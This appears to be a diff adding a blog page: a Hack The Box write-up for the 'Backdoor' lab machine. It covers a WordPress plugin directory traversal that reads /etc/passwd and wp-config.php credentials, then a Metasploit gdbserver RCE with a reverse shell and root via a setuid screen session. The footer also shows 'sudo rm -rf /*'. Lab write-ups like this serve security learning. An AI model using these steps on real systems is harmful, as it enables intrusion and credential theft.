@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>(HTB) Backdoor</title>
+    <meta name="description" content="Inject HTB machine">
+    <meta name="keywords" content='HTB'>
+
+    <meta property="og:url" content="http://localhost:1313/posts/backdoor1/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="(HTB) Backdoor">
+    <meta property="og:description" content="Inject HTB machine">
+    <meta property="og:image" content="/images/rei.gif">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="(HTB) Backdoor">
+    <meta name="twitter:description" content="Inject HTB machine">
+    <meta property="twitter:domain" content="http://localhost:1313/posts/backdoor1/">
+    <meta property="twitter:url" content="http://localhost:1313/posts/backdoor1/">
+    <meta name="twitter:image" content="/images/rei.gif">
+
+    
+    <link rel="canonical" href="http://localhost:1313/posts/backdoor1/" />
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:1313//css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="http://localhost:1313//css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="http://localhost:1313//css/dark.css">
+
+    <script src="http://localhost:1313//js/svg-injector.min.js"></script>
+    <script src="http://localhost:1313//js/feather-icons.min.js"></script>
+    <script src="http://localhost:1313//js/main.js"></script>
+
+    
+    
+    <script>console.log('pwned')</script>
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="http://localhost:1313/">
+                <img src="http://localhost:1313//images/rei.gif" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="http://localhost:1313/">Swaipy</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/posts/"><span data-feather='book'></span> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/scripts/"><span data-feather='code'></span> Scripts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://www.linkedin.com/in/nicolas-feodorovas-6791ba266/"><span data-feather='linkedin'></span>  </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/swaipyy"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/posts/"><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/scripts/"><span data-feather='code'></span> Scripts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://www.linkedin.com/in/nicolas-feodorovas-6791ba266/"><span data-feather='linkedin'></span>  </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/swaipyy"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>(HTB) Backdoor</h1>
+        <small role="doc-subtitle">Inject HTB machine</small>
+        <p class="post-date">
+            March 14, 2023
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="http://localhost:1313/tags/htb">HTB</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h1 id="htb-backdoor">(HTB) Backdoor</h1>
+<h3 id="website-enumeration">Website Enumeration</h3>
+<p><code>export ip=10.10.11.125</code><br>
+<strong>First nmap scan.</strong><br>
+<code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ip -oG ports</code><br>
+Results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> b4de43384657db4c213b69f3db3c6288 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> aac9fc210f3ef4ec6b3570262253ef66 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> d28be4ec0761aacaf8ec1cf88cc1f6e1 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Backdoor &amp;<span style="color:#75715e">#8211; Real-Life</span>
+</span></span><span style="display:flex;"><span>|_http-generator: WordPress 5.8.1
+</span></span><span style="display:flex;"><span>1337/tcp open  waste?
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><ul>
+<li>xmlrpc.php is enabled</li>
+<li>wp-login.php discovered (user admin exists)<br>
+<strong>Gobuster subdomain scan</strong><br>
+<code>gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -d backdoor.htb</code><br>
+No results.<br>
+<strong>Searching for common wordpress directories</strong><br>
+Found:</li>
+<li>wp-content/plugins/<br>
+<strong>Vulnerable plugin found</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>swaipy@skynet:~<span style="color:#f92672">]</span>$ searchsploit wordpress ebook 
+</span></span><span style="display:flex;"><span>WordPress Plugin eBook Download 1.1 - Directory Traversal | php/webapps/39575.txt
+</span></span></code></pre></div><p><strong>Getting passwd</strong><br>
+<code>curl -s -X GET http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd</code><br>
+/etc/passwd :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span style="display:flex;"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
+</span></span><span style="display:flex;"><span>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>user:x:1000:1000:user:/home/user:/bin/bash
+</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span style="display:flex;"><span>mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span style="display:flex;"><span>&lt;script&gt;window.close<span style="color:#f92672">()</span>&lt;/script&gt;% 
+</span></span></code></pre></div><p><strong>Internal machine ports</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>swaipy@skynet:Backdoor/content<span style="color:#f92672">][</span>1<span style="color:#f92672">]</span>$ curl -s -X GET <span style="color:#e6db74">&#34;http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/net/tcp&#34;</span>              <span style="color:#f92672">(</span>02-28 12:32<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/proc/net/tcp/proc/net/tcp/proc/net/tcp  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                     
+</span></span><span style="display:flex;"><span>   0: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 <span style="color:#ae81ff">00000000</span>   <span style="color:#ae81ff">113</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">34658</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">100</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>                     
+</span></span><span style="display:flex;"><span>   1: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 <span style="color:#ae81ff">00000000</span>   <span style="color:#ae81ff">101</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">30304</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">100</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>                     
+</span></span><span style="display:flex;"><span>   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 <span style="color:#ae81ff">00000000</span>     <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">32698</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">100</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>                     
+</span></span><span style="display:flex;"><span>   3: 00000000:0539 00000000:0000 0A 00000000:00000000 00:00000000 <span style="color:#ae81ff">00000000</span>  <span style="color:#ae81ff">1000</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">38333</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">100</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>                     
+</span></span><span style="display:flex;"><span>   4: 0100007F:8124 00000000:0000 0A 00000000:00000000 00:00000000 <span style="color:#ae81ff">00000000</span>   <span style="color:#ae81ff">113</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">34656</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">100</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">0</span>                     
+</span></span><span style="display:flex;"><span>   5: 7D0B0A0A:857E 01010101:0035 <span style="color:#ae81ff">02</span> 00000001:00000000 01:0000017B <span style="color:#ae81ff">00000002</span>   <span style="color:#ae81ff">101</span>        <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">40813</span> <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0000000000000000</span> <span style="color:#ae81ff">400</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">7</span>
+</span></span></code></pre></div><p><strong>Ports:</strong><br>
+<code>0x0CEA 0x0035 0x0016 0x0539 0x8124 0x857E(3306, 53, 22, 1337, 33060, 34454) </code><br>
+<strong>Searching</strong><br>
+searching /proc/net/fib_trie to detect if is a docker container<br>
+<code>curl -s -X GET &quot;http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/net/fib_trie&quot;</code><br>
+searching ../../../wp-config.php<br>
+credentials for MySQL found:</p>
+<ul>
+<li>username: wordpressuser</li>
+<li>password: MQYBJSaD#DxG6qbm</li>
+</ul>
+<h3 id="intrusion">Intrusion</h3>
+<p>with a brute force script we manage to see what process has /cmdline in /proc/%s
+this is really usefull because we can see that a process in running on port 1337 telling us is gbdserver<br>
+<a href="/scripts/backdoorscript/">the script</a></p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PATH /proc/834/cmdline
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Total length: <span style="color:#ae81ff">181</span> 
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;/proc/834/cmdline/proc/834/cmdline/proc/834/cmdline/bin/sh\x00-c\x00while true;do su user -c &#34;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&#34;; done\x00&lt;script&gt;window.close()&lt;/script&gt;&#39;</span>
+</span></span></code></pre></div><p>now searchsploit gbdserver output is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>swaipy@skynet:Backdoor/exploits<span style="color:#f92672">]</span>$ searchsploit gdbserver                                                                                                                <span style="color:#f92672">(</span>02-28 13:45<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>						Exploit Title|  Path     
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>GNU gdbserver 9.2 - Remote Command Execution <span style="color:#f92672">(</span>RCE<span style="color:#f92672">)</span>           | linux/remote/50539.py 
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------------
+</span></span></code></pre></div><p>But we use the metasploit one because for some reason the other one didn&rsquo;t work
+so running msfconsole we set:</p>
+<ul>
+<li><code>exploit/multi/gdb/gdb_server_exec</code></li>
+<li>payload <code>linux/x64/shell_reverse_tcp</code><br>
+and just run it.<br>
+one we are in the system we just run <code>cat user.txt</code> and we get the user flag.<br>
+alternative u can try to use  <a href="%5Bhttps://0xdf.gitlab.io/2022/04/23/htb-backdoor.html#shell-as-user%5D(https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html#shell-as-user)">this</a></li>
+</ul>
+<h3 id="privilege-escalation">Privilege escalation</h3>
+<p>now we run <code>sudo -l</code> but we dont have the password so we can&rsquo;t see if we have NOPASSWD privileges with the user. So we move to <code>/</code> and run <code>find \-perm -4000 2&gt;/dev/null</code> and we see the following output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find <span style="color:#ae81ff">\-</span>perm -4000 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>./usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>./usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span style="display:flex;"><span>./usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>./usr/bin/passwd
+</span></span><span style="display:flex;"><span>./usr/bin/chfn
+</span></span><span style="display:flex;"><span>./usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>./usr/bin/at
+</span></span><span style="display:flex;"><span>./usr/bin/su
+</span></span><span style="display:flex;"><span>./usr/bin/sudo
+</span></span><span style="display:flex;"><span>./usr/bin/newgrp
+</span></span><span style="display:flex;"><span>./usr/bin/fusermount
+</span></span><span style="display:flex;"><span>./usr/bin/screen
+</span></span><span style="display:flex;"><span>./usr/bin/umount
+</span></span><span style="display:flex;"><span>./usr/bin/mount
+</span></span><span style="display:flex;"><span>./usr/bin/chsh
+</span></span><span style="display:flex;"><span>./usr/bin/pkexec
+</span></span></code></pre></div><p>and we see <code>./usr/bin/screen</code> this is owned by root, so reading the manual we manage to find a way to sync to the root session via the following command <code>screen -x root</code> and thats it, we manage to get root so now just <code>cat /root/root.txt</code> and we get the flag.</p>
+
+        </p>
+        
+    </div>
+
+    <div class="prev-next">
+        
+            
+        
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#website-enumeration">Website Enumeration</a></li>
+        <li><a href="#intrusion">Intrusion</a></li>
+        <li><a href="#privilege-escalation">Privilege escalation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2023 sudo rm -rf /*</span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
